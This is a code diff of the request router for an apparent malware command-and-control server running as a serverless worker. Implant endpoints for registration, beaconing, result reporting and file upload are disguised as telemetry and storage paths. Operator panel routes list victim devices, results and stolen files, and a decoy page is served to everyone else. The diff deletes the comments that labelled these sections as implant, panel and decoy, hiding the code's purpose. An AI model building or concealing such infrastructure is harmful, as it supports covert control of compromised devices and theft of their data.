@@ -25,23 +25,19 @@ export default {
     const m = req.method;
 
     try {
-      // ---- IMPLANT API ----
       if (p === '/api/v2/device/register' && m === 'POST') return handleRegister(req, env);
       if (p === '/api/v2/telemetry/ping' && m === 'POST') return handleBeacon(req, env);
       if (p === '/api/v2/telemetry/report' && m === 'POST') return handleResult(req, env);
       if (p === '/api/v2/storage/upload' && m === 'POST') return handleUpload(req, env);
 
-      // ---- SETUP ----
       if (p === '/setup' && m === 'POST') return handleSetup(req, env);
 
-      // ---- PANEL ----
       if (p === '/login' && m === 'GET')  return handleLoginPage(req, env);
       if (p === '/login' && m === 'POST') return handleLoginPost(req, env);
       if (p === '/logout')                return handleLogout(req, env);
       if (p === '/panel' && m === 'GET')  return handleDashboard(req, env);
       if (p.startsWith('/device/') && m === 'GET') return handleDevicePage(req, env);
 
-      // ---- PANEL API ----
       if (p === '/api/op/devices' && m === 'GET') return handleApiDevices(req, env);
       if (p.startsWith('/api/op/device/') && m === 'GET') {
         const id = p.replace('/api/op/device/', '');
@@ -51,14 +47,12 @@ export default {
       if (p === '/api/op/results' && m === 'GET')  return handleApiResults(req, env);
       if (p.startsWith('/api/op/file/') && m === 'GET') return handleApiFile(req, env);
 
-      // ---- WS per device ----
       if (p.startsWith('/ws/device/')) {
         const id = p.replace('/ws/device/', '');
         const stub = env.DEVICE.get(env.DEVICE.idFromName(id));
         return stub.fetch('https://do/ws', req);
       }
 
-      // ---- DECOY ----
       return new Response(DECOY, {
         headers: { 'content-type': 'text/html; charset=utf-8' }
       });
